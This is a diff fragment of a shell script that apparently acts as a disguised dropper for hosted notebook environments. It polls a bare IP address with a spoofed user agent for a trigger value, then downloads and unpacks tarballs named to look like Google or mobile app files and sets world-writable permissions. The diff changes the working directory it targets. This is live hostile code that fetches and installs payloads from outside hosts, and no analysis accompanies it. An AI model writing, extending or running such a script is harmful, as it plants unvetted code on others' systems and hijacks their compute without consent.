@@ -33,7 +33,7 @@ google84="26884"
 string=$(curl -s -A "mobile84" http://154.127.52.52/?work=workjob)
 if [[ $string == *"16384"* ]]; then
 
-cd /notebooks/
+cd /mnt/disks/user/project/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google84121274.tar.gz
 tar -xvf ./google84121274.tar.gz
@@ -59,7 +59,7 @@ google841212121274="http://154.127.52.52"
 
 chmod -R 777 ./
 
-cd /notebooks/
+cd /mnt/disks/user/project/
 
 wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps84121274.tar.gz
 tar -xvf ./googleapps84121274.tar.gz
